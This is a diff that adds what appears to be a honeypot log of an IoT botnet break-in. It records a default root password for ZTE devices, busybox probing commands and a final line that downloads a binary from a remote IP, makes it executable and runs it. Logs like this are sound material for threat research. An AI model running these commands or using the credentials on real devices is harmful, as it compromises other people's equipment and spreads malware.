@@ -1,0 +1,13 @@
+from: 109.105.79.46:56467 user:root password:Zte521
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox AWZXP
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox AWZXP
+tftp; wget; /bin/busybox AWZXP
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox AWZXP
+rm .s; wget http://36.236.79.127:3425/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
